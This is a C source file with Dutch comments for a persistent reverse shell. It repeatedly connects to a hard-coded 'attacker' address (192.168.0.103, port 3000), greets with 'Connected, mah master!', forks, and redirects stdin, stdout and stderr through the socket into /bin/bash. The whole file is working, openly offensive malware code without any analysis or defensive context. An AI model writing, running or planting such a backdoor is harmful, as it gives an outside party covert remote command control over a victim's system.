#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
 
int main(){ 

	
    int sockfd; 		//de socket
    int n; 				//de connectie met de socket
    int pid; 			//het proces van de shell
    char command[10];	//custom command
    struct sockaddr_in attacker_addr;   
    //socklen_t sinsize;
    
    
    
    while(1){
	//while(1): deze code wordt altijd uitgevoerd, wat er ook gebeurt.
	
	sockfd = socket(AF_INET, SOCK_STREAM, 0); 					//de socket(IPv4 domein, communicatie type TCP, extra protocol 0)
    attacker_addr.sin_family = AF_INET;							//attacker met IPv4
    attacker_addr.sin_port = htons(3000);						//attacker poort
    attacker_addr.sin_addr.s_addr = inet_addr("192.168.0.103");	//attacker's adres/domein
    
    //memset(&(attacker_addr.sin_zero),'\0',8); //voor shellcode in assembly
    
    
    n = connect(sockfd, (struct sockaddr *)&attacker_addr, sizeof(struct sockaddr)); //maak connectie met attacker via de socket
	while(n < 0){
		//connectie is mislukt: probeer het elke 5 seconden opnieuw.
		sleep(5);
		n = connect(sockfd, (struct sockaddr *)&attacker_addr, sizeof(struct sockaddr));
    }
    n = write(sockfd,"Connected, mah master!\n",24);
    
    pid = fork(); //als er een connectie is: 'kopieer' het proces
    if(pid < 0){
		//kopieren mislukt: ga verder met de while loop, dus probeer het opnieuw
		continue;
	}
	if(pid == 0){
		//kopie gelukt: zorg nu dat alle input en output door de socket gaan (van/naar de attacker/victim)
		
		dup2(sockfd,0); // stdin
		dup2(sockfd,1); // stdout
		dup2(sockfd,2); // stderr
		
		//bin/bash wordt opgestart: alle input gaat naar de shell -> alle output gaat via de socket naar de attacker
		execl("/bin/bash", "/bin/bash", NULL);
	}
    
    
}
	return 0;

}
